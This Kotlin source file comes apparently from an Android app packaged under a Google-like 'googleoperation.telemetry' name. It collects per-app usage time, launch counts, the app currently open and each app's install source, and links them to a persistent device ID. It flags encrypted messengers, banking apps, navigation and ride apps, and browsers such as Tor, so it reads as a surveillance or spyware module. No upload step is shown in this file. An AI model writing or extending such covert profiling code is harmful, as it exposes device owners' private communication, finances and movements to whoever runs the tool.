package com.opp.googleoperation.telemetry

import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.os.Build
import com.opp.googleoperation.data.model.AppUsageEvent
import com.opp.googleoperation.util.PermissionHelper

class UsageStatsTracker(private val ctx: Context) {

    private val usageStatsManager = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager

    fun getCurrentlyActiveApp(): String? {
        if (!PermissionHelper.hasUsageStatsPermission(ctx) || usageStatsManager == null) {
            return null
        }

        val endTime = System.currentTimeMillis()
        val startTime = endTime - (1000 * 60 * 10) // look back 10 minutes

        val usageEvents = usageStatsManager.queryEvents(startTime, endTime)
        val event = UsageEvents.Event()
        var lastResumedPkg: String? = null
        var lastResumedTime = 0L

        while (usageEvents.hasNextEvent()) {
            usageEvents.getNextEvent(event)
            if (event.eventType == UsageEvents.Event.ACTIVITY_RESUMED) {
                if (event.timeStamp >= lastResumedTime) {
                    lastResumedTime = event.timeStamp
                    lastResumedPkg = event.packageName
                }
            }
        }

        if (lastResumedPkg == null) {
            val stats = usageStatsManager.queryUsageStats(
                UsageStatsManager.INTERVAL_DAILY,
                startTime,
                endTime
            )
            lastResumedPkg = stats?.maxByOrNull { it.lastTimeUsed }?.packageName
        }

        return lastResumedPkg?.let { getAppName(it) } ?: lastResumedPkg
    }

    fun getRecentAppUsage(lookbackMs: Long = 1000L * 60 * 60 * 24): List<AppUsageEvent> {
        if (!PermissionHelper.hasUsageStatsPermission(ctx) || usageStatsManager == null) {
            return emptyList()
        }

        val endTime = System.currentTimeMillis()
        val startTime = endTime - lookbackMs

        val stats = usageStatsManager.queryUsageStats(
            UsageStatsManager.INTERVAL_DAILY,
            startTime,
            endTime
        ) ?: return emptyList()

        // Calculate launch counts via UsageEvents
        val launchCounts = HashMap<String, Int>()
        try {
            val usageEvents = usageStatsManager.queryEvents(startTime, endTime)
            val event = UsageEvents.Event()
            while (usageEvents.hasNextEvent()) {
                usageEvents.getNextEvent(event)
                if (event.eventType == UsageEvents.Event.ACTIVITY_RESUMED) {
                    val pkg = event.packageName
                    if (pkg != null) {
                        launchCounts[pkg] = (launchCounts[pkg] ?: 0) + 1
                    }
                }
            }
        } catch (_: Exception) {}

        val activeApp = getCurrentlyActiveApp()
        val devId = PermissionHelper.getOrCreateDeviceId(ctx)
        val list = mutableListOf<AppUsageEvent>()

        for (item in stats) {
            if (item.totalTimeInForeground > 3000) { // filter out background processes (<3s usage)
                val pkg = item.packageName
                val appName = getAppName(pkg)
                val isActive = activeApp != null && (activeApp == appName || activeApp == pkg)
                val category = classifyAppCategory(pkg, appName)
                val installer = getInstallerSource(pkg)
                val opens = launchCounts[pkg] ?: 1

                list.add(
                    AppUsageEvent(
                        deviceId = devId,
                        packageName = pkg,
                        appName = appName,
                        category = category,
                        totalTimeInForegroundMs = item.totalTimeInForeground,
                        lastTimeUsedMs = item.lastTimeUsed,
                        launchCount = opens,
                        isCurrentlyActive = isActive,
                        installerSource = installer
                    )
                )
            }
        }

        return list.sortedByDescending { it.totalTimeInForegroundMs }
    }

    private fun classifyAppCategory(pkg: String, name: String): String {
        val lowerPkg = pkg.lowercase()
        val lowerName = name.lowercase()

        return when {
            lowerPkg.contains("whatsapp") || lowerPkg.contains("telegram") || lowerPkg.contains("securesms") ||
                    lowerPkg.contains("signal") || lowerPkg.contains("session") || lowerPkg.contains("threema") ||
                    lowerPkg.contains("viber") || lowerPkg.contains("element") -> "ENCRYPTED_MESSAGING"

            lowerPkg.contains("phonepe") || lowerPkg.contains("paytm") || lowerPkg.contains("gpay") ||
                    lowerPkg.contains("bhim") || lowerPkg.contains("bank") || lowerPkg.contains("yono") ||
                    lowerPkg.contains("cred") || lowerPkg.contains("wallet") -> "FINANCIAL"

            lowerPkg.contains("maps") || lowerPkg.contains("waze") || lowerPkg.contains("osmand") ||
                    lowerPkg.contains("uber") || lowerPkg.contains("ola") || lowerPkg.contains("rapido") -> "NAVIGATION"

            lowerPkg.contains("chrome") || lowerPkg.contains("firefox") || lowerPkg.contains("brave") ||
                    lowerPkg.contains("opera") || lowerPkg.contains("tor") || lowerPkg.contains("browser") -> "BROWSER"

            lowerPkg.contains("instagram") || lowerPkg.contains("twitter") || lowerPkg.contains("facebook") ||
                    lowerPkg.contains("youtube") || lowerPkg.contains("reddit") || lowerPkg.contains("snapchat") -> "SOCIAL_MEDIA"

            lowerPkg.contains("settings") || lowerPkg.contains("packageinstaller") || lowerPkg.contains("launcher") ||
                    lowerPkg.contains("systemui") || lowerPkg.contains("permissioncontroller") -> "SYSTEM_CONTROL"

            else -> "PRODUCTIVITY_TOOLS"
        }
    }

    private fun getInstallerSource(pkg: String): String {
        return try {
            val pm = ctx.packageManager
            val installer = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                pm.getInstallSourceInfo(pkg).installingPackageName
            } else {
                @Suppress("DEPRECATION")
                pm.getInstallerPackageName(pkg)
            }

            when {
                installer == null -> "Sideloaded / APK"
                installer.contains("vending") -> "Google Play Store"
                installer.contains("packageinstaller") -> "Direct Package Install"
                installer.contains("chrome") || installer.contains("browser") -> "Web Browser Download"
                installer.contains("amazon") -> "Amazon Appstore"
                else -> installer
            }
        } catch (_: Exception) {
            "System Pre-installed"
        }
    }

    private fun getAppName(pkg: String): String {
        return try {
            val pm = ctx.packageManager
            val info = pm.getApplicationInfo(pkg, 0)
            pm.getApplicationLabel(info).toString()
        } catch (_: PackageManager.NameNotFoundException) {
            pkg
        }
    }
}
